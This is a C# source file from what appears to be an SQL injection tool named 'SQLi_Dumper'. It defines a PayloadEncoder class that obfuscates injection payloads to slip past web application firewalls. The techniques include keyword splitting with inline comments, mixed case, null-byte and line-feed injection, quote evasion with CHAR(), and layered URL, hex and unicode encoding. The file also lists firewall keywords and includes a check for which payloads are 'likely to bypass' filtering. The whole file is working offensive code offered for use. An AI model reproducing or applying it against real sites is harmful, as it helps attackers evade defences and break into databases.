using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Web;

namespace SQLi_Dumper
{
    /// <summary>
    /// Payload encoding and obfuscation techniques for WAF bypass
    /// </summary>
    public class PayloadEncoder
    {
        private static PayloadEncoder _instance;
        private readonly Dictionary<string, Func<string, string>> _encoders;
        private readonly Dictionary<string, Func<string, string>> _obfuscators;

        public static PayloadEncoder Instance
        {
            get
            {
                if (_instance == null)
                    _instance = new PayloadEncoder();
                return _instance;
            }
        }

        private PayloadEncoder()
        {
            _encoders = new Dictionary<string, Func<string, string>>();
            _obfuscators = new Dictionary<string, Func<string, string>>();
            InitializeEncoders();
            InitializeObfuscators();
        }

        /// <summary>
        /// Encodes a payload using the specified encoding method
        /// </summary>
        public string Encode(string payload, string encodingMethod)
        {
            if (string.IsNullOrEmpty(payload) || string.IsNullOrEmpty(encodingMethod))
                return payload;

            if (_encoders.ContainsKey(encodingMethod.ToLower()))
                return _encoders[encodingMethod.ToLower()](payload);

            return payload;
        }

        /// <summary>
        /// Obfuscates a payload using the specified obfuscation method
        /// </summary>
        public string Obfuscate(string payload, string obfuscationMethod)
        {
            if (string.IsNullOrEmpty(payload) || string.IsNullOrEmpty(obfuscationMethod))
                return payload;

            if (_obfuscators.ContainsKey(obfuscationMethod.ToLower()))
                return _obfuscators[obfuscationMethod.ToLower()](payload);

            return payload;
        }

        /// <summary>
        /// Applies multiple encoding/obfuscation techniques
        /// </summary>
        public string ApplyMultipleTechniques(string payload, List<string> techniques)
        {
            string result = payload;
            foreach (var technique in techniques)
            {
                result = Encode(result, technique);
                result = Obfuscate(result, technique);
            }
            return result;
        }

        /// <summary>
        /// Generates various encoded versions of a payload
        /// </summary>
        public List<string> GenerateVariations(string payload)
        {
            var variations = new List<string> { payload };

            // Apply single encoding methods
            foreach (var encoder in _encoders)
            {
                try
                {
                    var encoded = encoder.Value(payload);
                    if (!variations.Contains(encoded))
                        variations.Add(encoded);
                }
                catch
                {
                    // Skip invalid encodings
                }
            }

            // Apply single obfuscation methods
            foreach (var obfuscator in _obfuscators)
            {
                try
                {
                    var obfuscated = obfuscator.Value(payload);
                    if (!variations.Contains(obfuscated))
                        variations.Add(obfuscated);
                }
                catch
                {
                    // Skip invalid obfuscations
                }
            }

            // Apply combinations
            var combinations = new[]
            {
                new[] { "url", "mixed_case" },
                new[] { "double_url", "comment_injection" },
                new[] { "hex", "mixed_case" },
                new[] { "unicode", "html" }
            };

            foreach (var combo in combinations)
            {
                try
                {
                    string combined = payload;
                    foreach (var method in combo)
                    {
                        combined = Encode(combined, method);
                        combined = Obfuscate(combined, method);
                    }
                    if (!variations.Contains(combined))
                        variations.Add(combined);
                }
                catch
                {
                    // Skip invalid combinations
                }
            }

            return variations;
        }

        private void InitializeEncoders()
        {
            // URL encoding
            _encoders["url"] = payload => HttpUtility.UrlEncode(payload);
            
            // Double URL encoding
            _encoders["double_url"] = payload => HttpUtility.UrlEncode(HttpUtility.UrlEncode(payload));
            
            // Hex encoding
            _encoders["hex"] = payload => "0x" + BitConverter.ToString(Encoding.ASCII.GetBytes(payload)).Replace("-", "");
            
            // Base64 encoding
            _encoders["base64"] = payload => Convert.ToBase64String(Encoding.UTF8.GetBytes(payload));
            
            // Unicode encoding
            _encoders["unicode"] = payload => string.Join("", payload.Select(c => "\\u" + ((int)c).ToString("x4")));
            
            // HTML encoding
            _encoders["html"] = payload => HttpUtility.HtmlEncode(payload);
            
            // Percent encoding
            _encoders["percent"] = payload => string.Join("", payload.Select(c => "%" + ((int)c).ToString("x2")));
            
            // ASCII encoding
            _encoders["ascii"] = payload => string.Join("", payload.Select(c => "&#" + (int)c + ";"));
            
            // Octal encoding
            _encoders["octal"] = payload => string.Join("", payload.Select(c => "\\" + Convert.ToString(c, 8)));
            
            // Binary encoding
            _encoders["binary"] = payload => string.Join("", payload.Select(c => Convert.ToString(c, 2).PadLeft(8, '0')));
        }

        private void InitializeObfuscators()
        {
            // Mixed case obfuscation
            _obfuscators["mixed_case"] = payload => ApplyMixedCase(payload);
            
            // Comment injection
            _obfuscators["comment_injection"] = payload => ApplyCommentInjection(payload);
            
            // Whitespace manipulation
            _obfuscators["whitespace"] = payload => ApplyWhitespaceManipulation(payload);
            
            // Keyword obfuscation
            _obfuscators["keyword"] = payload => ApplyKeywordObfuscation(payload);
            
            // Concatenation obfuscation
            _obfuscators["concatenation"] = payload => ApplyConcatenationObfuscation(payload);
            
            // Function obfuscation
            _obfuscators["function"] = payload => ApplyFunctionObfuscation(payload);
            
            // Quote evasion
            _obfuscators["quote_evasion"] = payload => ApplyQuoteEvasion(payload);
            
            // Null byte injection
            _obfuscators["null_byte"] = payload => ApplyNullByteInjection(payload);
            
            // Line feed injection
            _obfuscators["line_feed"] = payload => ApplyLineFeedInjection(payload);
            
            // Alternative operators
            _obfuscators["alt_operators"] = payload => ApplyAlternativeOperators(payload);
        }

        private string ApplyMixedCase(string payload)
        {
            var result = new StringBuilder();
            bool upperCase = false;
            
            foreach (char c in payload)
            {
                if (char.IsLetter(c))
                {
                    result.Append(upperCase ? char.ToUpper(c) : char.ToLower(c));
                    upperCase = !upperCase;
                }
                else
                {
                    result.Append(c);
                }
            }
            
            return result.ToString();
        }

        private string ApplyCommentInjection(string payload)
        {
            return payload.Replace(" ", "/**/ ")
                         .Replace("AND", "/**/AND/**/")
                         .Replace("OR", "/**/OR/**/")
                         .Replace("UNION", "/**/UNION/**/")
                         .Replace("SELECT", "/**/SELECT/**/")
                         .Replace("FROM", "/**/FROM/**/")
                         .Replace("WHERE", "/**/WHERE/**/")
                         .Replace("ORDER", "/**/ORDER/**/")
                         .Replace("GROUP", "/**/GROUP/**/")
                         .Replace("HAVING", "/**/HAVING/**/")
                         .Replace("INSERT", "/**/INSERT/**/")
                         .Replace("UPDATE", "/**/UPDATE/**/")
                         .Replace("DELETE", "/**/DELETE/**/");
        }

        private string ApplyWhitespaceManipulation(string payload)
        {
            var random = new Random();
            var whitespaceChars = new[] { " ", "\t", "\n", "\r", "\f", "\v" };
            
            return payload.Replace(" ", whitespaceChars[random.Next(whitespaceChars.Length)]);
        }

        private string ApplyKeywordObfuscation(string payload)
        {
            var substitutions = new Dictionary<string, string>
            {
                { "SELECT", "SEL/**/ECT" },
                { "UNION", "UNI/**/ON" },
                { "FROM", "FR/**/OM" },
                { "WHERE", "WH/**/ERE" },
                { "AND", "AN/**/D" },
                { "OR", "O/**/R" },
                { "ORDER", "ORD/**/ER" },
                { "GROUP", "GRO/**/UP" },
                { "HAVING", "HAV/**/ING" },
                { "INSERT", "INS/**/ERT" },
                { "UPDATE", "UPD/**/ATE" },
                { "DELETE", "DEL/**/ETE" }
            };
            
            string result = payload;
            foreach (var sub in substitutions)
            {
                result = result.Replace(sub.Key, sub.Value);
            }
            
            return result;
        }

        private string ApplyConcatenationObfuscation(string payload)
        {
            // Replace string literals with concatenated parts
            var pattern = @"'([^']*)'";
            var matches = System.Text.RegularExpressions.Regex.Matches(payload, pattern);
            
            string result = payload;
            foreach (System.Text.RegularExpressions.Match match in matches)
            {
                if (match.Groups[1].Value.Length > 2)
                {
                    var value = match.Groups[1].Value;
                    var mid = value.Length / 2;
                    var concat = $"'{value.Substring(0, mid)}'||'{value.Substring(mid)}'";
                    result = result.Replace(match.Value, concat);
                }
            }
            
            return result;
        }

        private string ApplyFunctionObfuscation(string payload)
        {
            var functionMappings = new Dictionary<string, string>
            {
                { "COUNT", "COUNT" },
                { "LENGTH", "LEN" },
                { "SUBSTRING", "SUBSTR" },
                { "CONCAT", "CONCAT" },
                { "UPPER", "UCASE" },
                { "LOWER", "LCASE" }
            };
            
            string result = payload;
            foreach (var mapping in functionMappings)
            {
                result = result.Replace(mapping.Key, mapping.Value);
            }
            
            return result;
        }

        private string ApplyQuoteEvasion(string payload)
        {
            // Replace single quotes with various alternatives
            return payload.Replace("'", "CHAR(39)")
                         .Replace("\"", "CHAR(34)")
                         .Replace("`", "CHAR(96)");
        }

        private string ApplyNullByteInjection(string payload)
        {
            // Inject null bytes at strategic positions
            return payload.Replace(" ", "%00 ")
                         .Replace("AND", "AND%00")
                         .Replace("OR", "OR%00")
                         .Replace("UNION", "UNION%00")
                         .Replace("SELECT", "SELECT%00");
        }

        private string ApplyLineFeedInjection(string payload)
        {
            // Inject line feeds and carriage returns
            return payload.Replace(" ", "%0A ")
                         .Replace("AND", "AND%0D%0A")
                         .Replace("OR", "OR%0D%0A")
                         .Replace("UNION", "UNION%0D%0A")
                         .Replace("SELECT", "SELECT%0D%0A");
        }

        private string ApplyAlternativeOperators(string payload)
        {
            var operatorMappings = new Dictionary<string, string>
            {
                { "=", "LIKE" },
                { "!=", "NOT LIKE" },
                { "<>", "NOT LIKE" },
                { "AND", "&&" },
                { "OR", "||" },
                { "NOT", "!" }
            };
            
            string result = payload;
            foreach (var mapping in operatorMappings)
            {
                result = result.Replace(" " + mapping.Key + " ", " " + mapping.Value + " ");
            }
            
            return result;
        }

        /// <summary>
        /// Gets available encoding methods
        /// </summary>
        public List<string> GetAvailableEncodingMethods()
        {
            return _encoders.Keys.ToList();
        }

        /// <summary>
        /// Gets available obfuscation methods
        /// </summary>
        public List<string> GetAvailableObfuscationMethods()
        {
            return _obfuscators.Keys.ToList();
        }

        /// <summary>
        /// Tests if a payload is likely to bypass common WAF patterns
        /// </summary>
        public bool IsLikelyToBypassWAF(string payload)
        {
            var wafPatterns = new[]
            {
                "UNION",
                "SELECT",
                "INSERT",
                "UPDATE",
                "DELETE",
                "DROP",
                "CREATE",
                "ALTER",
                "EXEC",
                "EXECUTE",
                "SCRIPT",
                "JAVASCRIPT",
                "VBSCRIPT",
                "ONLOAD",
                "ONERROR",
                "ONCLICK"
            };
            
            var normalizedPayload = payload.ToUpper();
            
            // Check if payload contains obvious SQL keywords
            foreach (var pattern in wafPatterns)
            {
                if (normalizedPayload.Contains(pattern))
                    return false;
            }
            
            // Check for common SQL injection patterns
            if (normalizedPayload.Contains("' OR '") ||
                normalizedPayload.Contains("' AND '") ||
                normalizedPayload.Contains("1=1") ||
                normalizedPayload.Contains("1=2") ||
                normalizedPayload.Contains("'='"))
            {
                return false;
            }
            
            return true;
        }

        /// <summary>
        /// Generates WAF bypass variations of a payload
        /// </summary>
        public List<string> GenerateWAFBypassVariations(string payload)
        {
            var variations = new List<string>();
            
            // Apply different obfuscation techniques
            var techniques = new[]
            {
                "mixed_case",
                "comment_injection",
                "whitespace",
                "keyword",
                "concatenation",
                "quote_evasion",
                "null_byte",
                "line_feed",
                "alt_operators"
            };
            
            foreach (var technique in techniques)
            {
                var variation = Obfuscate(payload, technique);
                if (!variations.Contains(variation))
                    variations.Add(variation);
            }
            
            // Apply encoding after obfuscation
            var encodingMethods = new[] { "url", "double_url", "hex", "unicode" };
            
            foreach (var method in encodingMethods)
            {
                foreach (var technique in techniques)
                {
                    var obfuscated = Obfuscate(payload, technique);
                    var encoded = Encode(obfuscated, method);
                    if (!variations.Contains(encoded))
                        variations.Add(encoded);
                }
            }
            
            return variations;
        }
    }
}